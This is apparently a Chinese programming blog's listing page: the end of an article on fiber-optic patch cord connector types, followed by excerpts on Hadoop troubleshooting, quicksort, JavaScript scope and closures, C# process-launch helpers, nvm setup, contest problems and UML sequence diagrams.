光纤跳线(又称光纤连接器)是指光缆两端都装上连接器插头，用来实现光路活动连接;一端装有插头则称为尾纤。光纤跳线（Optical Fiber Patch Cord/Cable)和同轴电缆相似，只是没有网状屏蔽层。中心是光传播的玻璃芯。在多模光纤中，芯的直径是50μm65μm，大致与人的头发的粗细相当。而单模光纤芯的直径为8μm10μm。芯外面包围着一层折射率比芯低的玻璃封套，以使光纤保持在芯内。再外面的是一层薄的塑料外套，用来保护封套。
光纤跳线的分类和概述如下：
光纤跳线（又称光纤连接器），也就是接入光模块的光纤接头，也有好多种，且相互之间不可以互用。SFP模块接LC光纤连接器，而GBIC接的是SC光纤连接器。下面对网络工程中几种常用的光纤连接器进行详细的说明：
①FC型光纤跳线：外部加强方式是采用金属套，紧固方式为螺丝扣。一般在ODF侧采用(配线架上用的最多)
②SC型光纤跳线：连接GBIC光模块的连接器，它的外壳呈矩形，紧固方式是采用插拔销闩式，不须旋转。(路由器交换机上用的最多)
③ST型光纤跳线：常用于光纤配线架，外壳呈圆形，紧固方式为螺丝扣。(对于10Base-F连接来说，连接器通常是ST类型。常用于光纤配线架)
④LC型光纤跳线：连接SFP模块的连接器，它采用操作方便的模块化插孔(RJ)闩锁机理制成。(路由器常用)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a56c1390fba54005dc3181002a9838b1/" rel="bookmark">
			【实用工具】快上车，程序狗好用的奇淫技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言🍊缘由⏲️本文阅读时长🎯主要目标 正文🧙‍♂️1.魔术橡皮擦🐕2.狗屁不通文章生成器🥞3.easypdf🥽4.Md2All🌮5.CSDN开发助手👨‍💻6.猿如意🧩7.Pexels 素材图片🧰8.Apifox⛺9.ToDesk远程办公工具⌨10.CodeIf起名神器 写在最后 前言 🍊缘由 没有杜蕾斯的夜晚没有安全感，没有趁手工具的程序狗不是好码农!
本狗从业6年之久，经历了社会的毒打，也尝试过工作中的各种姿势项目。虽由铁杵磨成了针，但也总结了些许趁手的工具，特此与大家分享。
⏲️本文阅读时长 约10分钟
🎯主要目标 分享开发工作中常用工具有助于提供工作效率，增加摸鱼时间 正文 🧙‍♂️1.魔术橡皮擦 方便像我这样的不懂PS抠图的程序狗，直接在线涂改，抠图神器
地址： https://magicstudio.com/magiceraser
功能：魔术橡皮擦一个在线智能去水印美化图片的网站,主要功能是一键无损擦除图像中不需要的元素,而且还能利用AI技术智能填充背景。
🐕2.狗屁不通文章生成器 平时需要长篇文本填充页面时，直接输入主题生成后，在这里面复制即可
地址： http://www.atoolbox.net/Tool.php?Id=853
功能：狗屁不通文章生成器,就是你随便输入一个主题,然后这个生成器可以根据你输入主题的文字,生成一篇文章。
🥞3.easypdf 方便pdf，word,ppt等互转，主要是免费
地址： https://easypdf.com/cn/
功能：easypdf提供了pdf转换的一系列服务工具,特点是安全,免费,无限制,你可以根据需要将pdf转换成word,ppt,excel或者JPG/PNG图片,也支持反向操作。
🥽4.Md2All 排版工具，一键排版，优化美观代码，还可以自定义样式，方便发布自己博客时，进行美化。
地址： http://md.aclickall.com/
功能：Md2All能让Markdown内容，无需作任何调整就能一键复制到微信公众号、博客园、掘金、知乎、csdn、51cto、wordpress、hexo等平台。
本人排版样式，放置与此，大家可参考
/*可任意修改样式，或恢复预设值，保存后生效 相对“默认样式”而作的修改会用 红色 标注*/ .output_wrapper/*此属性为全局*/ { font-size: 16px; color: #3e3e3e; line-height: 1.6; word-spacing:0px; letter-spacing:0px; font-family: "Helvetica Neue",Helvetica,"Hiragino Sans GB","Microsoft YaHei",Arial,sans-serif; } .output_wrapper * { font-size: inherit ; color: inherit; line-height: inherit; margin:0px; padding:0px; } p {/*段落*/ margin: 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a56c1390fba54005dc3181002a9838b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b0a763ff431cfe91b936979f1e38da3/" rel="bookmark">
			Hadoop集群启动从节点没有DataNode
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、问题背景
二、解决思路
三、解决办法：
一、问题背景 之前启动hadoop集群的时候都没有问题，今天启动hadoop集群的时候，从节点的DataNode没有启动起来。
二、解决思路 遇见节点起不来的情况，可以去看看当前节点的日志文件
我进入当前从节点的hadoop安装目录的Logs文件下去查看日志，发现日志报了错误（查看了日志如果发现有很多at的情况，那就说明是有问题了，不用去管那一大长串at，我们只需要找到at之前的第一句就好了，那一句才是问题的关键）
我查看日志文件的时候，出现如下错误：
WARN org.apache.hadoop.hdfs.server.common.Storage: Failed to add storage directory [DISK]file:/home/hadoop/software/hadooptmp/dfs/data
org.apache.hadoop.hdfs.server.common.InconsistentFSStateException: Directory /home/hadoop/software/hadooptmp/dfs/data is in an inconsistent state: Can't format the storage directory because the current directory is not empty.
问题大体说的就是我的存放数据的目录不能添加文件，说当前目录不为空。
三、解决办法： 1. 在集群的主节点，用root身份，进入tmp 目录
用root用户登录之后
cd /tmp
之后 ll 查看tmp目录下的内容
会看见以hadoop开头的一些文件（我的这里有三个文件，可能你的和我的不太一样，但是没关系），把以hadoop开头的文件全部删除
删除的目的是因为，接下来要从新格式化hadoop集群，这些文件是之前格式化文件的时候产生的，如果不删除这些文件，直接从新格式化hadoop集群的话，之后可能会出现一些问题，有冲突的情况，所以这里要先把这些文件删除了。
2. 删除hadoop的日志文件
（1）删除hadoop存储数据的文件下的所有内容，每台主机都要分别删除
如果不知道自己hadoop存储数据的目录在哪里，可以到hadoop安装目录下的/etc/hadoop/core-site.xml 文件下查看
（2）分别在集群的每台主机，进入hadoop安装目录的logs文件，将logs下边的所有文件全部删除。
注意：这里hadoop集群的每台主机都要去删除
3. 格式化hadoop
hadoop namenode -format
4. 启动Hadoop集群
start-all.sh
5. 之后jps查看，问题就解决了
以上就是我解决问题的步骤了，希望可以帮助到你，如果有什么不清楚的地方请留言
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6b389c693e4bf58fa79dff0412a40ca/" rel="bookmark">
			快速排序及其变体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		快速排序（Quick Sort） 原理解析 对于要排序的区间，先定一个基准数p（基准数可随机指定，可指定区间两端，或者区间中心的数为基准数）。然后将区间中小于p的数放到p之前，大于p的数放在p之后，最后使用分治策略，分别对p之前的子区间和p之后的子区间递归并排序。
该算法平均时间复杂度 O ( N × l o g N ) O(N\times log N) O(N×logN)，最坏 O ( N 2 ) O(N^2) O(N2)。
有多种方法可以实现上述以p为界的区间划分，下面以升序排序为例介绍一种较为常用的方法：
新建两个指针，分别指向区间的左右两端。并取区间左端的值为基准数p（此时视为将p抽离原区间，区间最左端为空）。
右指针左移，直到找到比p小的数，然后将该数填充至左指针指向位置（也就是区间最左端空置的位置）。
左指针右移，直到找到比p大的数，然后将该数填充至右指针指向位置（原来右指针的指向的值在步骤2中被移动到区间最左端，此时其指向的位置也可以视为空置）。
重复步骤2、3，直到两指针相交或越界，此时将p放置于左指针所指位置。
遍历完整个区间后，对p这单个元素的排序已完成，p此时被放置到未来数组有序时p应该处于的位置。在p前面的数都比它小，在p后面的数都比它大，此时开始分治递归p之前的区间和p之后的区间，重复1至5步。
代码 void QuickSort(int* a, int lef, int rig){ if (lef &gt;= rig) return; int p = a[lef], i = lef, j = rig; while (i &lt; j) { while (i&lt;j &amp;&amp; a[j]&gt;=p) j--; a[i] = a[j]; while (i&lt;j &amp;&amp; a[i]&lt;=p) i++; a[j] = a[i]; } a[i] = p; QuickSort(a, lef, i-1); QuickSort(a, i+1, rig); } 进一步的优化 小区间优化：若待排序数组较小（N&lt;100），使用快速排序效率可能不如选择排序，因此可加入条件判断，在数组较小时使用选择排序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6b389c693e4bf58fa79dff0412a40ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9415a7015b3332dd41392360a3d264e7/" rel="bookmark">
			10 FFmpeg从入门到精通-FFmpeg接口libavfilter的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 10.FFmpeg接口libavfilter的使用 10.1 filtergraph和filter简述 10.2 FFmpeg中预留的滤镜 10.2.1 音频滤镜 10.2.1 视频滤镜 10.3 avfilter流程图 10.4 使用滤镜加LOGO操作 10.5 小结 10.FFmpeg接口libavfilter的使用 10.1 filtergraph和filter简述 10.2 FFmpeg中预留的滤镜 10.2.1 音频滤镜 10.2.1 视频滤镜 10.3 avfilter流程图 10.4 使用滤镜加LOGO操作 10.5 小结 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48337a42910666f632a493a8c486257a/" rel="bookmark">
			9 FFmpeg从入门到精通-FFmpeg接口libavcodec的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 9.FFmpeg接口libavcodec的使用 9.1 FFmpeg旧接口的使用 9.1.1 FFmpeg旧接口视频解码 9.1.2 FFmpeg旧接口视频编码 9.1.3 FFmpeg旧接口音频解码 9.1.4 FFmpeg旧接口音频编码 9.2 FFmpeg新接口的使用 9.2.1 FFmpeg新接口音频编码 9.2.2 FFmpeg新接口音频解码 9.2.3 FFmpeg新接口视频编码 9.2.4 FFmpeg新接口视频解码 9.3 小结 9.FFmpeg接口libavcodec的使用 9.1 FFmpeg旧接口的使用 9.1.1 FFmpeg旧接口视频解码 9.1.2 FFmpeg旧接口视频编码 9.1.3 FFmpeg旧接口音频解码 9.1.4 FFmpeg旧接口音频编码 9.2 FFmpeg新接口的使用 9.2.1 FFmpeg新接口音频编码 9.2.2 FFmpeg新接口音频解码 9.2.3 FFmpeg新接口视频编码 9.2.4 FFmpeg新接口视频解码 9.3 小结 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89c2455da020bf7f0986df852eef5ba7/" rel="bookmark">
			你真的了解闭包吗？，闭包是如何实现的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要把作用域与闭包联系起来，因为闭包是作用域息息相关的，作用域就是产生闭包的一部分。 一、作用域 1、什么是作用域 作用域：作用域是在程序运行时代码中的某些特定部分中变量、函数和对象的可访问性。简单来说就是一块独立的存放空间。外层作用域无法访问内层作用域变量（除开闭包）。我们再来看看那有些作用域：
全局作用域：不在大括号内或者函数内声明的变量就是全局作用域下的，也就叫做全局变量。全局作用域下声明的变量再程序任何位置都能访问。函数作用域：在函数内部的范围就是函数作用域，函数作用域内只能函数内部进行访问，无法在外部进行访问（闭包除外）。 块级作用域：在大括号内的范围就是块级作用域，比如 for 循环的大括号内，if 大括号内都是块级作用域。在大括号外无法对内部进行访问（var 声明的变量除外）静态作用域：静态作用域又叫词法作用域，当前变量所在作用域被创建时就确定好了，而非执行阶段确定的，js遵循的就是静态作用域。动态作用域：动态作用域就是与代码执行顺序有关，变量所在的作用域是在代码执行的时候确定的。 2、作用域链 作用域链其实就是作用域相互嵌套，作用域之间形成引用关系，这样就生成了作用域链。作用域链我们也可以叫做静态作用域链，因为作用域链的查找规则就是遵循的静态作用域。
我们来看下面这段代码
const age = 1 function foo() { console.log(age) // 1 } function bar() { const age = 2 foo() } 为何打印输出的是1，而不是2。因为静态作用域在变量、函数在定义的时候就确定好了，而不是执行时确定好的，所以上面 foo 所在的作用域直接就是全局作用域，在查找 age 变量的时候，自己函数作用域查找不到，就会向上级作用域查找，就找到了全局作用域下的 age，而不是 bar 函数作用域下的 age。
二、闭包 1、闭包的概念 什么是闭包？
维基百科对闭包的解释：
1、闭包又称词法闭包或函数闭包；
2、是在支持头等函数的编程语言中，是实现词法绑定的一种技术；
3、闭包在实现上是一个结构体，它存储了一个函数和一个关联的环境；
4、闭包跟函数最大的区别在于，当捕捉闭包的时候，它的自由变量会在捕捉时被确定，这样即使脱离了捕捉时的上下文，它也能照常运行。
MDN对闭包的解释：
1、一个函数和对其周围状态的引用捆绑在一起（或者说函数被引用包围），这样的组合就是闭包。
2、也就是说，闭包让你可以在一个内层函数中访问到期外层函数的作用域。
3、在JavaScript中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。
好像还是不太明白，那我们继续往下看。
2、闭包是如何形成的 闭包简单来说就是：函数访问了外层作用域变量就会产生闭包。为什么说函数访问了外层作用域变量就会产生闭包呢？我们来看下面例子：
function foo() { const age = 1 const name = 'cj'; return function bar() { const sum = '2' console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89c2455da020bf7f0986df852eef5ba7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2eb08b4e03e7f3020aea8fdabbb107a/" rel="bookmark">
			let、const 真的没有变量提升吗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、var var 是在 ES6 之前用于声明变量的命令。让我们来看一下它主要的特点：
允许声明重复变量var 存在变量提升（后面做详细介绍）var 变量不是在函数内声明会添加进 window 对象（全局变量）不存在块级作用域，就比如在 for 循环、if 语句等中使用 var 声明变量，可在外层进行访问。 二、let let 是ES6 新增的命令。主要特点：
不允许声明重复变量存在暂时性死区（后面做详细介绍）let 声明的变量不会添加进 window，即使在全局作用域下声明，也不会加入到 windows 中。存在块级作用域，在大括号内使用 let 声明的变量，外层无法访问 三、const const 也是 ES6 新增的命令，let 有的特性它都有，它们主要的区别就是：
声明必须赋值赋值后不可重新赋值，如果是赋值引用类型，引用类型的属性可以修改。因为 const 无法控制引用地址的更改。 四、变量提升与暂时性死区 显示变量提升：就是使用 var 声明的变量，在 js 预解析的时候，会将变量的声明提升至全局或函数的顶端。如下方代码：在某个作用域中使用 var 声明变量在后，赋值在前，但是还是不会报错。
function foo() { bar = 1; var bar; console.log(bar) // 1 } 暂时性死区：所谓暂时性死区就是不能再初始化之前使用变量。但是 let、const 就没有变量提升吗？我们看一下下面代码：
function foo() { console.log(bar) // Cannot access 'bar' before initialization let bar; } foo() 我们发现报的错误信息说的是：初始化前无法访问 bar 。也就是说在变量声明前进行访问时，变量还未进行初始化。其实我们对于变量进行声明分为两个步骤：1、创建变量 2、对变量初始化。看到上面的执行报错结果，我们知道了 let 声明变量前访问变量，初始化操作是一定没有的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2eb08b4e03e7f3020aea8fdabbb107a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc4b68c41e96dd56b17892a304fe990e/" rel="bookmark">
			2020第十一届蓝桥杯C/C&#43;&#43; B组省赛-J-字串排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023大厂真题提交网址(含题解): www.CodeFun2000.com（http://101.43.147.120/）
最近我们一直在将收集到的机试真题制作数据并搬运到自己的OJ上，供大家免费练习,体会真题难度。现在OJ已录入50+道2023年最新大厂真题，同时在不断的更新。同时，可以关注"塔子哥学算法"公众号获得每道题的题解。
提醒，这个算法只能拿70分，V大了之后这个算法应该有问题! 题目大意： 给你一个数 V ( V ≤ 10000 ) V(V \leq 10000) V(V≤10000).让你构造出一个只含小写字母的字符串使得其逆序对恰好为 V V V.如果有多个解,输出长度最短的.如果还有解,输出字典序最小的.
题目思路: 1.这个题考虑从前往后一位一位填,找规律后应该先要看出几个结论:
1.1 最终总长度不会很长. 因为逆序对最大可以是 n 2 n^2 n2级别的.(虽然只有26个字母,但是长度大于26后我们还是可以构造一个有 n 2 n^2 n2级别的逆序对)
1.2 最终字符串一定是非递增的.
个人认为这个直觉是很强烈的.因为只有非递增的字符串才能让逆序对尽量大,才可以使得长度能控制的尽量短.
1.3.假设去重后字符串变成 s s s.那么一定满足 s i + 1 = s i + 1 s_{i+1}=s_{i}+1 si+1​=si​+1.这个也很好证明.
2.现在有了上面三个结论,我们自然能够想出一个算法:
2.1 先枚举长度 1 1 1到 V V V.看长度为 i i i的字符串的[最大逆序对]是多少.第一个[最大逆序对]大于等于 V V V的长度一定就是最终长度.
2.2 接着从小到大枚举[只使用前 j j j个字符]是否能够.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc4b68c41e96dd56b17892a304fe990e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3908bacb04e2ed7b3d2a584682118db7/" rel="bookmark">
			C# -- 运行Bat文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行 .bat 文件 方法1：不关注结果 /** * 运行bat文件 * 在新窗口调用，忽略返回值 * @param path 绝对路径 */ public static void runBat(string path) { if (!File.Exists(path)) { //Console.WriteLine("文件不存在！"); return; } try { Process process = new Process(); FileInfo fileInfo = new FileInfo(path); process.StartInfo.WorkingDirectory = fileInfo.Directory.FullName; process.StartInfo.FileName = fileInfo.Name; process.StartInfo.CreateNoWindow = false; process.Start(); process.WaitForExit(); process.Close(); } catch (Exception e) { Console.WriteLine(e.Message); } } 方法2： /** * 运行bat文件 * @param path 绝对路径 * @return 输出内容 */ public static String runBatBack(string path) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3908bacb04e2ed7b3d2a584682118db7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b6c347afce0f9fea64e39ba91d2deee/" rel="bookmark">
			C# -- 运行命令行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运行windows命令行 PS: 原理：使用进程调用 cmd.exe 程序 + 参数； 局限性：仅可运行自带指令（ipconfig,getmac...）, 在程序内部调用CMD读取不到环境变量，所以执行不了一些第三方命令(java...)； 封装函数： /** * @param cmd 命令行 * return 执行结果 */ public static string runCmdBack(string cmd) { StringBuilder builder = new StringBuilder(); try { Process process = new Process(); process.StartInfo.FileName = "cmd.exe"; //执行命令 process.StartInfo.Arguments = "/c " + cmd; process.StartInfo.UseShellExecute = false;//不启用shell process.StartInfo.RedirectStandardInput = true; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.StartInfo.CreateNoWindow = true;//不使用窗口 process.Start(); StreamReader reader = process.StandardOutput; string line = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b6c347afce0f9fea64e39ba91d2deee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e2e3d6f42e529cb072636afd9c74a3b/" rel="bookmark">
			OpenHarmonyApp启动页后记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 回顾 通过DevEco Studio端云协同开发OpenHarmony/HarmonyOS应用程序(以下简称应用)集成AppGallery Connect(以下简称AGC)平台云函数、云数据库、云存储三篇文章笔者从创建端云协同应用程序开始，逐步对云函数、云数据库、云存储简单的数据读取做了简单的介绍。通过使用云数据库、云存储相结合的方式使应用的启动页能够动态化，即可以在不更新应用的情况下更改启动页的参数已达到启动页的动态化。
2 问题及解决方案 问题： 由于启动页参数来源于云数据库、云存储，启动页数据渲染前会受网络影响出现白屏。
解决方案： 为启动页数据单独封装获取方法，在启动页新增状态值，数据未加载完成后显示当前应用的icon图标，数据加载完成后渲染实际获取到的数据。
注： 若读者有其他的处理方法可与笔者共同探讨一下。
3 优化调用方法 使用async将函数异步化，使用await获取Promise的值。
3.1 云数据库获取数据方法异步化 每次使用存储区都要在使用完成后释放，新增关闭存储区方法。
// service/CloudDBService.ts // @ts-ignore import * as schema from './app-schema.json'; import { splash } from './splash'; import { AGConnectCloudDB, CloudDBZoneConfig, CloudDBZone, CloudDBZoneQuery } from '@hw-agconnect/database-ohos'; import { AGCRoutePolicy } from '@hw-agconnect/core-ohos'; import { getAGConnect } from './AgcConfig'; export class CloudDBService { private static readonly ZONE_NAME = "cloudDBZoneSplash"; private static cloudDB: AGConnectCloudDB; private static cloudDBZone: CloudDBZone; private static isInit: boolean; public static async init(context: any): Promise&lt;boolean&gt; { if (this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e2e3d6f42e529cb072636afd9c74a3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2145f8f61ac303fd06f0e2daab2f55a7/" rel="bookmark">
			蓝桥杯算法竞赛培训(一) 开篇与算法竞赛通识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023大厂真题提交网址(含题解): www.CodeFun2000.com（http://101.43.147.120/）
最近我们一直在将收集到的机试真题制作数据并搬运到自己的OJ上，供大家免费练习,体会真题难度。现在OJ已录入50+道2023年最新大厂真题，同时在不断的更新。同时，可以关注"塔子哥学算法"公众号获得每道题的题解。
开篇 方法论： 1.&lt;费曼学习法&gt;是学习任何知识很通用的好方法，其核心是以教代学，我把它分成了三个阶段，个人认为一个知识点能够经过这三个阶段的检验才能算是完全吸收掌握。
2.&lt;刷题&gt;是因为我们算法竞赛有非常强的竞赛属性，不仅要理解某一知识点，还需要足够熟练才能够在有限的时间内，高压环境下完成比较好的表现，就如同俗话说的"台上一分钟，台下十年功"。
内容： 这里只是列一个大纲，可能会随着课程进度做一些调整。
竞赛通识 上课时留下了几个"尾巴",
1.stack,queue的用法2.汉诺塔的实现与分析*3.树的存储,图的存储,可以点击进行学习 作业 1.括号匹配
https://www.luogu.com.cn/problem/P1739
2.本质不同的字符串
https://www.luogu.com.cn/problem/P3370
3.约瑟夫环（可以先用暴力实现,把代码写好）
http://oj.ecustacm.cn/problem.php?id=1388
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81cee6695c3ea90d3dadbf5765fcc104/" rel="bookmark">
			蓝桥杯算法竞赛培训(二) 汉诺塔与STL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023大厂真题提交网址(含题解): www.CodeFun2000.com（http://101.43.147.120/）
最近我们一直在将收集到的机试真题制作数据并搬运到自己的OJ上，供大家免费练习,体会真题难度。现在OJ已录入50+道2023年最新大厂真题，同时在不断的更新。同时，可以关注"塔子哥学算法"公众号获得每道题的题解。
文章目录 2023大厂真题提交网址(含题解):1.递归-汉诺塔问题描述初步分析代码复杂度分析进阶技巧1. n = 1000 n=1000 n=1000时的移动次数:取模1.对加减乘除操作的取模2.大数取模3.阶乘取模 2. n = 1000000000000 n=1000000000000 n=1000000000000时的移动次数:快速幂3.问题变形分析 2.STL不定长数组vector字符串队列栈非线性结构：红黑树(set,map)1.set 预习 1.递归-汉诺塔 问题描述 我们的目的是要将整个塔移动到另一根桩柱上，每次只能移动一个圆盘，且较大的圆盘在移动过程中不能放置在较小的圆盘上面．问你具体的移动方案.
初步分析 用递归的思想分析我们知道，对于最下面的盘子，如果上面的 n − 1 n-1 n−1个盘子能够全部移动到柱 C C C上,我们就只需要将第n个盘子放到 B B B柱上，之后对在 C C C柱子上的 n − 1 n-1 n−1个盘子做相同的操作将其移动到 B B B盘上，整个过程就完成了。
代码 void Move (int n , char a , char b , char c){ if (n == 1) { cout &lt;&lt; "第" &lt;&lt; n &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81cee6695c3ea90d3dadbf5765fcc104/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f474f818560e7f6e0c1d9576d44cb0d/" rel="bookmark">
			“node-sass“: “^4.14.1“报错 Nvm安装，Node版本切换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、“node-sass”: "^4.14.1"版本必须与对应的Node版本对应，此nodesass对应14.16.1的版本 二、查看当前Node版本，打开命令运行框，输入Node-v查看当前Node版本号。 当前node版本号为14.16.1
三、进行node版本切换。 下载Nvm进行自行切换Node版本
1.卸载当前安装的Node，卸载干净。 2.进行Nvm的安装。 3.官网地址：链接: https://github.com/coreybutler/nvm-windows/releases 打开网址我们可以看到安装包
四、安装Nvm 1.安装 nvm 其实很简单，跟其他普通软件一样，傻瓜式安装，双击安装文件 nvm-setup.exe ，点击Next进入下一步
2.选择nvm安装路径，点击Next进入下一步
3.选择nodejs安装路径，这步安装需要注意的是你之前是否安装过 node 版本，如果安装过最好选择你之前安装的 node 目录（注意此目录很重要哦）
4.确认安装即可，但是如果你之前安装过 node 此时 nvm 会检测到提示是否把安装的版本加载到 nvm 版本管理中
5.如果之前你没有安装过 node 则完成上面操作等待即安装完成，但是如果之前有就会出现下面提示.
上面提示是告诉我们是否要将已有 node 添加到 nvm 版本中进行控制，一般我们选择是将以后添加进行 nvm 版本控制
6.出现下面提示表示我们软件安装完成
7.软件安装完确认是否正常，打开 cmd 输入 nvm -v 查看版本号，如果能打印出版本号，如下显示表示正常
五、使用安装Nvm安装Node版本 输入nvm install 16.0.0命令进行安装node16.0.0的版本。安装其他版本输入对应的版本号即可 例如14.0.0等
安装完成后使用命令nvm list查看所安装的node版本。
六、切换node版本 使用命令nvm use 16.0.016.0.0为对应的版本号 ，切换成功后会提示当时Nowing use 的版本为16.0.0，切换其他的输入对应的版本号即可。如果全局无效需要自己在环境变量中进行添加对应的Node版本的路径。
七、返回项目代码卸载已经安装的node依赖，然后重新进行npm install，问题解决。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d185778884f4455e1cd0d18879fbb45a/" rel="bookmark">
			【图形设计】手把手教你如何画好时序图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编辑导语：时序图可以有效地描述交互顺序，并帮助研发团队更清晰地理顺系统逻辑，做好流程分析，若利用得当，则可以一定程度上降低沟通成本，更快速地推进业务进行。本篇文章里，作者就时序图的构成与画法等方面做了总结，一起来看一下。
上次介绍了活动图，这次分享 UML 中，另一种流程分析利器——时序图。
以前每次要分析流程，我都会用活动图。直到有一次，我面对一个业务流程，画活动图，画来画去，总觉得哪里不对，但又表达不出来，感觉如鲠在喉。
后来，我想起时序图，用时序图把流程梳理了一遍，豁然开朗。
原来，用不同的视图去描述同一个流程，能让我们看到自己未曾发现的问题。就像看足球比赛，在多个不同位置的摄像镜头下，能看到球员更全面的表现。
此后，我用时序图甚至比活动图还多。
那么，它有啥特别之处，居然能替代活动图来分析流程？我们一起来看看。
一、解读时序图 时序图，也叫序列图、顺序图，是 UML 中常用的动态视图，用于描述多个对象参与实现业务目标时，彼此之间按时间顺序进行交互的过程。
时序图，用来表达对象或角色之间交互的信息传递和时间顺序，特别方便。
每次梳理流程，跟开发沟通，我都会借助它来描述。
绘制时序图，将一个个对象和其交互动作列出来，可以直观反映出，每个对象对其他对象、或其自身做的交互动作，让我们看到业务内部的运作、系统之间的互动，从而搞清楚业务规则、系统逻辑。
在《火球：UML 大战需求分析》一书中，作者总结特别好：“任何复杂的交互，都可以分解为自己与自己、自己与别人、别人与别人的多个简单交互”。
时序图正体现了这种逻辑，所以，它表达交互逻辑时，非常清晰简单。
客户用 ATM 取款的时序图
作为产品经理，如果我们能掌握这一利器，用来分析业务、定义需求，与开发沟通，定能大大提高效率。
时序图常见的应用场景，是在支付领域。例如，微信支付的开发者文档，就用时序图来表达支付的实现逻辑。
这么好的工具，赶紧学一下吧。
二、时序图的构成 时序图的常用元素很简单，分别有：对象（角色）、生命线、会话、消息（简单消息、返回消息）。
时序图的常用元素
1. 对象 对象，指与业务、产品或系统相关的人、事、物，可以是人、部门、系统等。
通常用矩形表示，画在时序图的顶部，对象名写在矩形内。
其中，参与交互过程的人，如用例图的参与者、参与完成业务目标的相关人员，通常称之为角色。
网上有的会把对象和角色分开来，我理解这些都是对象。只不过，在图形上，角色与用例图的参与者一样，用火柴人表示，比较好理解。
因为，UML 是在面向对象思想的指导下，来描述软件产品的分析与设计。面向对象，则将现实世界的人事物，看成一个个独立的个体，称之为「 对象 」。
它们又可以根据不同的需要，以不同的角度，被归纳在一起，这就是开发人员常说的「 类 」。
比如，西瓜、苹果、梨是不同的对象，它们可以归为一类——水果；苹果手机、华为手机、小米手机，可以归为手机。
对象的命名，一般格式为：对象名：类名，如「 李四：客户 」。
按照语法，冒号和类名是必需的，对象名是可选的。具体地说，「 李四：客户 」表示李四是客户的实例，即具体到某个客户的名字。
实践中，并不需要具体到实例，对象名可以不写。我的做法是，直接写一类对象的名称，如某某系统、某某部门。
2. 生命线 每个对象下有一条垂直的虚线，这就是对象的生命线，从上往下，代表时间的先后顺序。
3. 会话 会话，也叫激活框，它代表在对象生命线上某个阶段执行的操作，以一个偏窄的矩形表示。
每一次会话，表示一次相对完整的交互过程。不过，怎样算一次会话，实践中有点难区分，需要多练习体会。
我常按照操作的完整度来画，有时甚至不画，有些专业的 UML 工具还能自动生成会话。
4. 消息 消息，表示对象之间发送的信息或做的事情。消息，有的分为三种：同步消息、异步消息、返回消息。
从产品层面，并不需要规定技术的实现方式，是同步还是异步，这交给开发人员设计，会更为合理。
因此，我基本只用两种消息来表达：简单消息、返回消息。
1）简单消息
简单消息，用箭头实线，表示一个对象，向另一个对象发的信息，或做的事情。它不强调消息的类型，只表示交互，足以满足大部分情况。
2）返回消息
